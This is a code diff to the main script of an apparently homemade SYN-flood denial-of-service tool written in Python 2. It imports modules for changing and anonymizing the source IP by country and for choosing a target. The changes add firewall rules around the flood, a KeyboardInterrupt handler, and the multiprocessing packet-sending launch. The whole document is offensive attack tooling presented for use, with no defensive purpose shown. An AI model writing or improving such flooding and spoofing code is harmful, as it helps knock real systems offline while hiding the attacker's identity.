@@ -12,8 +12,7 @@ from Ipchanging_synflood import *
 from definepacket_synflood import *
 from uanonymizedIP_synflood import *
 from proceedtarget_synflood import *
-
-
+from configurefw_synflood import *
 yourIP = uanoIP()	
 supcountries = supcountries()
 destination = definetarget()
@@ -25,6 +24,7 @@ awnser_anonymizing = anonymizing_input(supcountries)
 
 if awnser_anonymizing == yourIP:
    Ip_range = yourIP
+   configurefw('restrict')
    time.sleep(5)
    os.system('clear')
    print 'HaCkEr5pReMe'
@@ -53,10 +53,13 @@ if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
 
 
 
-p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destinationnew, targetport, destination))
-p.start()
-p.join()
-
+try:
+  p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destinationnew, targetport, destination))
+  p.start()
+  p.join()
+except KeyboardInterrupt:
+  configurefw('reset')
+  exit(0)
 
 
 
